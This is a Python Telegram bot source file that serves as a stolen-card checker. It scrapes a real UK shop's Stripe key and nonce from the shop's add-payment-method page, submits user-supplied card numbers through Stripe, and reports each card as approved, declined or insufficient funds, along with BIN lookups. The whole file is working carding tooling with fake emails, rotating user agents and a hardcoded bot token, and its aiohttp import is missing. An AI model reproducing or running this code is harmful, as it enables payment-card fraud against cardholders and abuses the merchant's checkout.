import requests
import time
import asyncio
import re
import json
import random
import uuid
from datetime import datetime
from fake_useragent import UserAgent

# ============================================
# Bot Configuration - By Mustafa @o8380
# ============================================
TOKEN = "8564867940AFV_cbbIhvYHuWz5emA1Xy-MfiyGW-N0TU"
OWNER_ID = 1013384909
OWNER_USERNAME = "o8380"
OWNER_NAME = "Mustafa"

# ============================================
# Helper Functions
# ============================================

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except:
        return None

def generate_random_email():
    import string
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"

def generate_guid():
    return str(uuid.uuid4())

# ============================================
# Stripe Card Processing
# ============================================

async def process_stripe_card(card_data, proxy_url=None):
    ua = UserAgent()
    site_url = 'https://www.eastlondonprintmakers.co.uk/my-account/add-payment-method/'
    try:
        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            from urllib.parse import urlparse
            parsed = urlparse(site_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            email = generate_random_email()
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                'user-agent': ua.random
            }
            resp = await session.get(site_url, headers=headers, proxy=proxy_url)
            resp_text = await resp.text()
            
            # Get nonce
            add_card_nonce = (gets(resp_text, 'createAndConfirmSetupIntentNonce":"', '"') or 
                             gets(resp_text, 'add_card_nonce":"', '"'))
            
            # Get stripe key
            stripe_key = gets(resp_text, '"key":"pk_', '"')
            if not stripe_key:
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', resp_text)
                if pk_match:
                    stripe_key = pk_match.group(0)
            
            if not stripe_key:
                return False, 'Stripe key not found'
            
            # Create payment method
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'key': stripe_key
            }
            
            async with session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data) as pm_resp:
                pm_json = await pm_resp.json()
                
            if 'error' in pm_json:
                return False, pm_json['error']['message']
            
            pm_id = pm_json.get('id')
            if not pm_id:
                return False, 'Failed to create payment method'
            
            # Confirm
            confirm_data = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                '_ajax_nonce': add_card_nonce
            }
            
            async with session.post(f"{domain}/wp-admin/admin-ajax.php", data=confirm_data, 
                                    headers={'X-Requested-With': 'XMLHttpRequest'}) as confirm_resp:
                text = await confirm_resp.text()
                if 'success' in text:
                    js = json.loads(text)
                    if js.get('success'):
                        return True, 'Approved'
                    else:
                        error = js.get('data', {}).get('error', {}).get('message', 'Declined')
                        return False, error
            
            return False, 'Confirmation failed'
            
    except Exception as e:
        return False, f'Error: {str(e)}'

def check_card(card_input):
    try:
        parts = card_input.split('|')
        if len(parts) != 4:
            return "❌ Invalid format. Use: cc|month|year|cvv"
        
        cc, mes, ano, cvv = parts
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        card_data = {'number': cc, 'exp_month': mes, 'exp_year': ano, 'cvc': cvv}
        is_approved, response_msg = loop.run_until_complete(process_stripe_card(card_data))
        loop.close()
        
        if is_approved:
            return f"✅ APPROVED | {response_msg}"
        elif 'insufficient' in response_msg.lower():
            return f"💰 INSUFFICIENT FUNDS | {response_msg}"
        else:
            return f"❌ DECLINED | {response_msg}"
            
    except Exception as e:
        return f"❌ Error: {str(e)}"

# ============================================
# BIN Lookup
# ============================================

def get_bin_info(cc):
    result = {'brand': 'Unknown', 'type': 'Unknown', 'level': 'Unknown', 'bank': 'Unknown', 'country': 'Unknown', 'flag': '🌍'}
    try:
        response = requests.get(f"https://lookup.binlist.net/{cc[:6]}", headers={'Accept-Version': '3'}, timeout=8)
        if response.status_code == 200:
            data = response.json()
            result['brand'] = data.get('scheme', 'Unknown').upper()
            result['type'] = data.get('type', 'Unknown').upper()
            result['bank'] = data.get('bank', {}).get('name', 'Unknown')
            result['country'] = data.get('country', {}).get('name', 'Unknown')
            flag_map = {'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪', 'RU': '🇷🇺', 'AE': '🇦🇪'}
            result['flag'] = flag_map.get(data.get('country', {}).get('alpha2', ''), '🌍')
    except:
        pass
    return result

# ============================================
# Telegram Bot (without telebot library)
# ============================================

print(f"🤖 Bot Started - By {OWNER_NAME} @{OWNER_USERNAME}")
print(f"Token: {TOKEN[:20]}...")

# مسح الجلسة القديمة
try:
    requests.get(f"https://api.telegram.org/bot{TOKEN}/deleteWebhook?drop_pending_updates=true")
    requests.get(f"https://api.telegram.org/bot{TOKEN}/logOut")
    print("Session cleared")
except:
    pass

last_id = 0
print("Waiting for messages...")

while True:
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_id+1}&timeout=30"
        response = requests.get(url, timeout=35)
        data = response.json()
        
        if data.get("ok") and data.get("result"):
            for update in data["result"]:
                last_id = update["update_id"]
                chat_id = update["message"]["chat"]["id"]
                text = update["message"].get("text", "")
                first_name = update["message"]["chat"].get("first_name", "User")
                
                print(f"Message from {chat_id}: {text[:50]}")
                
                # Start command
                if text == "/start":
                    msg = f"""<b>Welcome {first_name} 🤖</b>
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] <b>Gateway:</b> Stripe Auth
[ϟ] <b>Developer:</b> @{OWNER_USERNAME}
- - - - - - - - - - - - - - - - - - - - - -
<b>Commands:</b>
/pp [card] - Check single card
/bin [bin] - BIN lookup
- - - - - - - - - - - - - - - - - - - - - -
<b>Format:</b> <code>123456|12|28|123</code>"""
                    
                    send_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
                    send_data = {"chat_id": chat_id, "text": msg, "parse_mode": "HTML"}
                    requests.post(send_url, json=send_data)
                
                # PP command
                elif text.startswith("/pp"):
                    card = text.replace("/pp", "").strip()
                    if not card:
                        msg = "❌ Usage: /pp 123456|12|28|123"
                    else:
                        msg = f"⏳ Checking card: {card[:20]}..."
                        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                                     json={"chat_id": chat_id, "text": msg})
                        
                        result = check_card(card)
                        
                        bin_data = get_bin_info(card)
                        bin_info = f"Info: {bin_data['brand']} · {bin_data['type']}\nBank: {bin_data['bank']}\nCountry: {bin_data['country']} {bin_data['flag']}"
                        
                        final_msg = f"""<b>#StripeAuth_Donation</b>
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] <b>Card:</b> <code>{card}</code>
[ϟ] <b>Result:</b> {result}
- - - - - - - - - - - - - - - - - - - - - -
{bin_info}
- - - - - - - - - - - - - - - - - - - - - -
[⌤] <b>Dev by:</b> @{OWNER_USERNAME}</b>"""
                        
                        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                                     json={"chat_id": chat_id, "text": final_msg, "parse_mode": "HTML"})
                
                # BIN command
                elif text.startswith("/bin"):
                    bin_num = text.replace("/bin", "").strip()
                    if not bin_num or len(bin_num) < 6:
                        msg = "❌ Usage: /bin 123456"
                    else:
                        bin_data = get_bin_info(bin_num[:6])
                        msg = f"""<b>🔍 BIN: {bin_num[:6]}</b>
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] Brand: {bin_data['brand']}
[ϟ] Type: {bin_data['type']}
[ϟ] Bank: {bin_data['bank']}
[ϟ] Country: {bin_data['country']} {bin_data['flag']}
- - - - - - - - - - - - - - - - - - - - - -
[⌤] @{OWNER_USERNAME}</b>"""
                    
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                                 json={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"})
                
                # Help command
                elif text == "/help":
                    msg = """<b>🤖 Stripe Auth Bot - Help</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>Commands:</b>
/pp 123456|12|28|123 - Check card
/bin 123456 - BIN lookup
/start - Restart bot
━━━━━━━━━━━━━━━━━━━━━━"""
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                                 json={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"})
                
                # Auto detect card format
                elif '|' in text and not text.startswith('/'):
                    result = check_card(text)
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                                 json={"chat_id": chat_id, "text": result})
                
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)
